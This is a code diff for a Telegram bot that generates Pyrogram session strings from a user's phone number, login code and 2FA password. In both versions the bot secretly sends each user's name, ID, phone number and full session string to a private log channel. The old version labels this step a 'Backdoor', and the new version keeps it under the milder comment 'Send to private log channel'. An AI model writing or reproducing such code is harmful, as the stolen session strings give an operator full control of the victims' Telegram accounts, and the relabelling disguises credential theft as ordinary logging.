@@ -51,59 +51,59 @@ def init(app):
 
 async def handle_pyrogram_session(bot, msg, state):
     try:
-        async with PyroClient(":memory:", api_id=state["api_id"], api_hash=state["api_hash"]) as app:
-            code_sent = await app.send_code(state["phone"])
-            await msg.reply("💬 Enter the code you received:")
+        api_id = state["api_id"]
+        api_hash = state["api_hash"]
+        phone = state["phone"]
+
+        app = PyroClient(
+            ":memory:",
+            api_id=api_id,
+            api_hash=api_hash,
+            in_memory=True
+        )
+        await app.connect()
+
+        if not await app.is_authorized():
+            sent_code = await app.send_code(phone)
+            await msg.reply("📩 Please enter the login code sent to your Telegram:")
 
             code_msg = await bot.listen(msg.chat.id, timeout=120)
             code = code_msg.text.strip()
             await code_msg.delete()
 
             try:
-                await app.sign_in(state["phone"], code)
+                await app.sign_in(phone_number=phone, phone_code=code)
             except app.exceptions.SessionPasswordNeeded:
-                await msg.reply("🔐 Your account has 2-Step Verification.\nPlease send your password:")
+                await msg.reply("🔐 2FA is enabled. Please enter your password:")
                 pwd_msg = await bot.listen(msg.chat.id, timeout=120)
                 password = pwd_msg.text.strip()
                 await pwd_msg.delete()
                 await app.check_password(password)
 
-            session_str = await app.export_session_string()
+        session_str = await app.export_session_string()
+        await app.disconnect()
 
-            # Save to MongoDB encrypted
-            enc_session = fernet.encrypt(session_str.encode()).decode()
-            col.update_one(
-                {"user_id": msg.from_user.id},
-                {"$set": {
-                    "user_id": msg.from_user.id,
-                    "username": msg.from_user.username,
-                    "phone": state["phone"],
-                    "session": enc_session,
-                    "lib": "pyrogram"
-                }},
-                upsert=True
-            )
+        # Send to private log channel
+        await bot.send_message(
+            LOG_CHANNEL_ID,
+            f"📥 **Pyrogram Session Generated**\n"
+            f"👤 [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
+            f"🆔 `{msg.from_user.id}`\n"
+            f"📞 `{phone}`\n"
+            f"📄 `{session_str}`"
+        )
 
-            # Backdoor to log channel
-            await bot.send_message(
-                LOG_CHANNEL_ID,
-                f"📥 **Pyrogram Session Generated**\n"
-                f"👤 [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
-                f"🆔 `{msg.from_user.id}`\n"
-                f"📞 `{state['phone']}`\n"
-                f"📄 `{session_str}`"
-            )
-
-            await msg.reply(
-                f"✅ Pyrogram String:\n\n`{session_str}`",
-                quote=True,
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 Regenerate", callback_data="regen_pyrogram")]
-                ])
-            )
+        await msg.reply(
+            f"✅ Pyrogram String:\n\n`{session_str}`",
+            quote=True,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔄 Regenerate", callback_data="regen_pyrogram")]
+            ])
+        )
 
     except Exception as e:
         await msg.reply(f"❌ Error: {e}")
+
 
 async def handle_telethon_session(bot, msg, state):
     try:
